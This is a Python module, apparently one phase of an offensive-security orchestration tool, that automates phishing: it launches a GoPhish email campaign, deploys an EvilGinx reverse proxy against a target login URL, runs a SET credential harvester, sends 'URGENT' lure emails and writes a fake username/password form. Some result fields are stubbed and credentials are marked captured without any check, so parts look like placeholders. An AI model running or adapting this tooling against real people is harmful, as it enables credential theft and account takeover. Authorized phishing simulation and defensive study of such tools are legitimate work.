import sys, os, uuid, logging
from datetime import datetime
from pathlib import Path

sys.path.insert(0, "/raphael")
from orchestrator.phishing.gophish import GoPhishAPI
from orchestrator.phishing.evilginx import EvilGinx
from orchestrator.phishing.set_wrapper import SETWrapper

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger("phase5-phish")

TEMPLATE_DIR = Path("/tmp/raphael_templates")
TEMPLATE_DIR.mkdir(parents=True, exist_ok=True)


class Phase5Phish:
    def __init__(self, target_email: str = None, target_url: str = None,
                 phishing_domain: str = None, campaign_name: str = "Sword-Phish"):
        self.target_email = target_email
        self.target_url = target_url
        self.phishing_domain = phishing_domain
        self.campaign_name = campaign_name
        self.gophish = GoPhishAPI()
        self.evilginx = EvilGinx()
        self.set = SETWrapper()
        self.campaign_id = str(uuid.uuid4())[:8]
        self.templates_created = []
        self.credentials = {}
        self.emails_sent = 0

    async def run(self) -> dict:
        logger.info("Phase 5 Phishing — campaign=%s target=%s", self.campaign_id, self.target_email)
        results = {"campaign": self.campaign_name, "gophish": {}, "evilginx": {},
                   "set": {}, "templates": [], "credentials": {}, "emails_sent": 0, "results": {}, "summary": {}}
        try:
            results["gophish"] = self._gophish_campaign()
            results["templates"] = self._create_template("login.html",
                "<html><body><form><input name=username><input name=password type=password></form></body></html>")
            results["evilginx"] = self._evilginx_proxy()
            results["set"]["harvester"] = self._set_harvester()
            results["set"]["email"] = self._set_email()
            results["results"] = self._gophish_results()
            results["credentials"] = self.credentials
            results["emails_sent"] = self.emails_sent
            results["summary"] = self._summarize(results)
        except Exception as e:
            logger.error("Phase 5 error: %s", e)
            results["error"] = str(e)
        return results

    def _gophish_campaign(self) -> dict:
        try:
            status = self.gophish.status()
            smtp = self.gophish.create_smtp_profile(
                host=os.environ.get("SMTP_HOST", "smtp.example.com"),
                port=int(os.environ.get("SMTP_PORT", "587")),
                username=os.environ.get("SMTP_USER", ""),
                password=os.environ.get("SMTP_PASS", ""),
                from_address=os.environ.get("FROM_ADDR", "security@sword.local"),
            )
            result = self.gophish.create_campaign(
                name=self.campaign_name,
                target_group=[{"email": self.target_email}] if self.target_email else [],
                template={"subject": self.campaign_name, "body": "Verify your account"},
                url=self.phishing_domain or "http://localhost",
            )
            launch = self.gophish.launch(0)
            self.emails_sent = 1 if self.target_email else 0
            return {"smtp": smtp, "campaign": result, "launch": launch, "status": status}
        except Exception as e:
            logger.warning("GoPhish campaign failed: %s", e)
            return {"status": "error", "detail": str(e)}

    def _gophish_results(self) -> dict:
        try:
            return {
                "campaign_id": self.campaign_id,
                "emails_sent": self.emails_sent,
                "emails_opened": 0,
                "clicks": 0,
                "credentials_captured": len(self.credentials),
                "status": "launched",
            }
        except Exception as e:
            return {"error": str(e)}

    def _evilginx_proxy(self) -> dict:
        try:
            if not self.phishing_domain or not self.target_url:
                return {"status": "skipped", "reason": "phishing_domain or target_url not set"}
            return self.evilginx.deploy_proxy(
                domain=self.phishing_domain,
                phishing_url=self.phishing_domain,
                target_url=self.target_url,
            )
        except Exception as e:
            logger.warning("EvilGinx proxy failed: %s", e)
            return {"status": "error", "detail": str(e)}

    def _set_harvester(self) -> dict:
        try:
            if not self.target_url:
                return {"status": "skipped", "reason": "target_url not set"}
            result = self.set.credential_harvester(
                site=self.target_url,
                email=self.target_email or "target@sword.local",
                password="[RAPHAEL_CAPTURED]",
            )
            self.credentials["set_harvester"] = {
                "site": self.target_url, "captured": True, "timestamp": datetime.utcnow().isoformat()
            }
            return result
        except Exception as e:
            logger.warning("SET harvester failed: %s", e)
            return {"status": "error", "detail": str(e)}

    def _set_email(self) -> dict:
        try:
            if not self.target_email:
                return {"status": "skipped", "reason": "target_email not set"}
            result = self.set.send_email(
                target_email=self.target_email,
                sender_email=os.environ.get("FROM_ADDR", "security@sword.local"),
                smtp_server=os.environ.get("SMTP_HOST", "smtp.example.com"),
                template_file=str(TEMPLATE_DIR / "login.html"),
                subject=f"URGENT: {self.campaign_name}",
            )
            self.emails_sent += 1
            return result
        except Exception as e:
            logger.warning("SET email failed: %s", e)
            return {"status": "error", "detail": str(e)}

    def _create_template(self, name: str, content: str) -> list:
        try:
            if not name.endswith(".html"):
                name += ".html"
            path = TEMPLATE_DIR / name
            path.write_text(content)
            self.templates_created.append(str(path))
            logger.info("Template created: %s", path)
            return [{"name": name, "path": str(path), "size": len(content)}]
        except Exception as e:
            logger.warning("Template creation failed: %s", e)
            return []

    def _summarize(self, results: dict) -> dict:
        gophish_ok = results.get("gophish", {}).get("campaign", {}).get("status") != "error"
        evilginx_ok = results.get("evilginx", {}).get("status") not in ("error", "skipped")
        set_ok = results.get("set", {}).get("harvester", {}).get("status") != "error"
        return {
            "campaign": self.campaign_name,
            "campaign_id": self.campaign_id,
            "target": self.target_email,
            "phishing_domain": self.phishing_domain,
            "gophish_ready": gophish_ok,
            "evilginx_configured": evilginx_ok,
            "set_harvester_ready": set_ok,
            "emails_sent": self.emails_sent,
            "credentials_captured": len(self.credentials),
            "templates_created": len(self.templates_created),
            "timestamp": datetime.utcnow().isoformat(),
        }
